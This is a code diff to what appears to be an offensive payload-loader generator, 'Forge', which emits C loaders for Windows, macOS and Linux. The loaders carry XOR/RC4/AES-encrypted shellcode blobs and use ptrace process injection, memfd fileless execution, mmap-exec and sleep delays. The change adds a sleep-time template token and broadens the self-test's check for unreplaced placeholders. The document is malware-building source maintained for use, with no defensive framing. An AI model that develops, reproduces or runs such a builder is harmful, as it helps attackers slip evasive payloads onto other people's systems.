@@ -866,6 +866,7 @@ class Forge:
                     .replace("@@MAINCALL@@", "    pf_dispatch(buf, PF_BLOB_LEN);")
                     .replace("@@ROUTENOTE@@", route_note)
                     .replace("@@BUILDID@@", buildid))
+            tmpl = tmpl.replace("@@SLEEPMS@@", str(sleepms))
             src_path = os.path.join(outdir, "loader.c")
             open(src_path, "w").write(tmpl)
             buildsh = self.win_buildsh(cfg, outdir)
@@ -893,7 +894,8 @@ class Forge:
                     .replace("@@SLEEPCODE@@", POSIX_SLEEP if sleepms else "static void pf_sleep(void) {}")
                     .replace("@@DECRYPTCODE@@",
                              MAC_AES if enc_id == 3 else MAC_RC4 if enc_id == 2 else MAC_XOR if enc_id == 1 else MAC_NOCRYPT)
-                    .replace("@@BUILDID@@", buildid))
+                    .replace("@@BUILDID@@", buildid)
+                    .replace("@@SLEEPMS@@", str(sleepms)))
             open(os.path.join(outdir, "loader.c"), "w").write(tmpl)
             buildsh = self.mac_buildsh(cfg, outdir)
             self.log("[*] Emitting macOS mmap-exec loader (PROT_READ|PROT_EXEC)")
@@ -917,7 +919,8 @@ class Forge:
                 self.log("[*] Emitting Linux ptrace injector (T1055.008)")
             else:
                 body = LIN_SC_MAIN
-            open(os.path.join(outdir, "loader.c"), "w").write(head + body)
+            src = (head + body).replace("@@SLEEPMS@@", str(sleepms))
+            open(os.path.join(outdir, "loader.c"), "w").write(src)
             buildsh = self.lin_buildsh(cfg, outdir)
             self.log("[*] Emitting Linux loader (" +
                      ("memfd fileless exec" if kind == "exe" else
@@ -1403,12 +1406,9 @@ def _selftest():
                         outdir = f.build(cfg, sc, pe)
                         src = open(os.path.join(outdir, "loader.c")).read()
                         checks += 1
-                        for token in ("@@KEYDECL@@", "@@IVDECL@@", "@@BLOBDECL@@",
-                                      "@@PEDECL@@", "@@SLEEPCODE@@", "@@DECRYPTCODE@@",
-                                      "@@EXECROUTE@@", "@@PEINJCODE@@", "@@DISPATCH@@",
-                                      "@@MAINCALL@@", "@@BUILDID@@"):
-                            if token in src:
-                                fails.append(f"{target}/{kind}/{enc}/{inj}: unreplaced {token}")
+                        # generic scan: ANY leftover @@TOKEN@@ is a bug
+                        for token in set(re.findall(r"@@[A-Z_]+@@", src)):
+                            fails.append(f"{target}/{kind}/{enc}/{inj}: unreplaced {token}")
                         if "PF_BLOB" not in src:
                             fails.append(f"{target}/{kind}/{enc}/{inj}: no PF_BLOB")
                         if enc == "None" and "PF_KEY" in src:
